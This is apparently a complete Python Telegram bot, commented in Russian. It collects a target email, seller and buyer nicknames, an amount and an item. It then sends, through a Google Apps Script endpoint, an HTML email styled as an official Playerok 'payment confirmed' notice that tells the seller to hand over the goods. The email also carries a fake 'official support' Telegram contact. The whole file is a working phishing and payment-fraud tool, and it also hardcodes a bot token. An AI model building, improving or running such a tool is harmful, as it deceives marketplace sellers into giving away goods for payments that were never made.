import asyncio, logging, aiohttp, os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiohttp import web

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8777068569:AAEl-874WqglkLNCl9Uyjc_VMApsNltS2Is'
GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwApBf3F8gJ34BGN5zvIlX_hPYkEz5K7aKDeoDH0pdE-I9TjCE-r2690IuTpl4OaJ9q/exec'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- ВЕБ-СЕРВЕР ДЛЯ ОБХОДА ОШИБКИ RENDER ---
async def handle(request):
    return web.Response(text="Bot is Alive!")

async def start_webserver():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    # Render передает порт в переменную PORT, по умолчанию ставим 8080
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"Web server started on port {port}")

# --- ШАБЛОН ПИСЬМА (ТОТ САМЫЙ ДИЗАЙН 1 В 1) ---
def get_html_template(seller, amount, item, buyer):
    s = seller.replace("@", ""); b = buyer.replace("@", "")
    return f"""
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="color-scheme" content="only">
</head>
<body style="margin:0; padding:0; background-color:#0a0a0a !important; color:#ffffff !important; font-family: sans-serif;">
    <div style="background-color:#0a0a0a !important; padding: 20px 10px; min-height: 100vh; text-align: center;">
        <div style="max-width:420px; margin:20px auto; text-align:left; background-color:#141414; border-radius:25px; border:1px solid #262626; overflow:hidden;">
            
            <div style="background: linear-gradient(135deg, #3291ff 0%, #00c2ff 100%) !important; padding: 30px 25px; margin-bottom: 0;">
                <table width="100%">
                    <tr>
                        <td>
                            <h2 style="margin:0; color:#ffffff !important; font-size:22px; font-weight:800;">Playerok • Сделка</h2>
                            <p style="margin:8px 0 0 0; color:#ffffff !important; font-size:12px; opacity:0.9;">Системное уведомление • Оплата подтверждена</p>
                        </td>
                        <td align="right" style="width:90px;">
                            <div style="background:#ffffff !important; color:#000000 !important; padding:8px 12px; border-radius:8px; font-weight:900; font-size:17px; text-align:center;">Player<span style="color:#3586ff !important;">ok</span></div>
                        </td>
                    </tr>
                </table>
            </div>

            <div style="padding:20px;">
                <div style="background-color:#1c1c1e; border-radius:18px; padding:15px; margin-bottom:12px; border:1px solid #262626;">
                    <table width="100%"><tr>
                        <td style="color:white; font-weight:700; font-size:16px;">👋 Здравствуйте, @{s}</td>
                        <td align="right"><span style="background:#2a2444; color:#9a8cff; padding:4px 10px; border-radius:10px; font-size:10px; font-weight:700;">SELLER</span></td>
                    </tr></table>
                </div>

                <div style="background-color:#1c1c1e; border-radius:18px; padding:20px; margin-bottom:12px; border:1px solid #262626;">
                    <div style="color:#828282; font-size:12px; margin-bottom:10px;">Статус</div>
                    <div style="background:#00a651; color:white; padding:8px 16px; border-radius:12px; font-size:13px; font-weight:800; display:inline-block; margin-bottom:15px;">✅ ОПЛАТА ПОДТВЕРЖДЕНА</div>
                    <div style="color:#828282; font-size:12px; margin-bottom:5px;">Сумма</div>
                    <div style="color:#00a651; font-size:32px; font-weight:800;">{amount} ₽</div>
                    <p style="color:#828282; font-size:13px; line-height:1.4;">Оплата зафиксирована системой. Передайте товар покупателю.</p>
                </div>

                <div style="background-color:#1c1c1e; border-radius:18px; padding:20px; border:1px solid #262626;">
                    <div style="color:#828282; font-size:12px; margin-bottom:15px; font-weight:700;">ДЕТАЛИ СДЕЛКИ</div>
                    <div style="color:#828282; font-size:11px; margin-bottom:4px;">Товар</div>
                    <div style="color:white; font-weight:700; margin-bottom:12px;">{item}</div>
                    <div style="color:#828282; font-size:11px; margin-bottom:4px;">Покупатель</div>
                    <div style="color:white; font-weight:700; margin-bottom:12px;">@{b}</div>
                    <div style="color:#00a651; font-weight:800; font-size:14px;">Оплачено</div>
                </div>

                <div style="background:#1c1814; border-left:4px solid #d29922; border-radius:12px; padding:15px; margin-top:15px;">
                    <div style="color:#e19d55; font-size:11px; font-weight:800; margin-bottom:8px;">ДЕЙСТВИЕ СЕЙЧАС</div>
                    <div style="color:white; font-size:14px;">Передайте товар: <span style="background:#000; padding:2px 6px; border-radius:6px; border:1px solid #333;">@{b}</span></div>
                </div>

                <a href="https://t.me/Helper_PlayerOK" style="display:block; background:#0a0a0a; border:1px solid #333; color:white; text-align:center; padding:16px; border-radius:15px; text-decoration:none; font-weight:700; margin-top:20px; font-size:14px;">Открыть поддержку в Telegram</a>
                <p style="text-align:center; color:#444; font-size:10px; margin-top:20px;">Официальный контакт: @Helper_PlayerOK<br>2026 Playerok</p>
            </div>
        </div>
    </div>
</body>
</html>
    """

# --- ЛОГИКА БОТА ---
class OrderState(StatesGroup):
    waiting_email = State(); waiting_seller = State(); waiting_amount = State(); waiting_item = State(); waiting_buyer = State()

async def send_via_google(email, body):
    async with aiohttp.ClientSession() as session:
        payload = {"email": email, "body": body}
        async with session.post(GOOGLE_SCRIPT_URL, json=payload, timeout=30) as resp:
            return await resp.text()

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    kb = InlineKeyboardBuilder().button(text="🚀 Создать уведомление", callback_data="start_order").as_markup()
    await message.answer("✅ Бот активен! Ошибка 'Timed Out' исправлена.", reply_markup=kb)

@dp.callback_query(F.data == "start_order")
async def start_order(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("1️⃣ Введите **Email**:")
    await state.set_state(OrderState.waiting_email); await callback.answer()

@dp.message(OrderState.waiting_email)
async def st1(m: types.Message, state: FSMContext):
    await state.update_data(email=m.text); await m.answer("2️⃣ Ник продавца:"); await state.set_state(OrderState.waiting_seller)

@dp.message(OrderState.waiting_seller)
async def st2(m: types.Message, state: FSMContext):
    await state.update_data(seller=m.text); await m.answer("3️⃣ Сумма (₽):"); await state.set_state(OrderState.waiting_amount)

@dp.message(OrderState.waiting_amount)
async def st3(m: types.Message, state: FSMContext):
    await state.update_data(amount=m.text); await m.answer("4️⃣ Товар:"); await state.set_state(OrderState.waiting_item)

@dp.message(OrderState.waiting_item)
async def st4(m: types.Message, state: FSMContext):
    await state.update_data(item=m.text); await m.answer("5️⃣ Ник покупателя:"); await state.set_state(OrderState.waiting_buyer)

@dp.message(OrderState.waiting_buyer)
async def st5(m: types.Message, state: FSMContext):
    data = await state.get_data(); buyer = m.text
    await m.answer("⏳ Отправка...");
    try:
        html = get_html_template(data['seller'], data['amount'], data['item'], buyer)
        res = await send_via_google(data['email'], html)
        await m.answer("✅ Письмо отправлено!" if "Success" in res else f"❌ Ошибка: {res}")
    except Exception as e: await m.answer(f"❌ Ошибка: {e}")
    await state.clear()

async def main():
    logging.basicConfig(level=logging.INFO)
    # Запускаем одновременно веб-сервер (чтобы Render не ругался) и бота
    await asyncio.gather(start_webserver(), dp.start_polling(bot))

if __name__ == "__main__":
    asyncio.run(main())
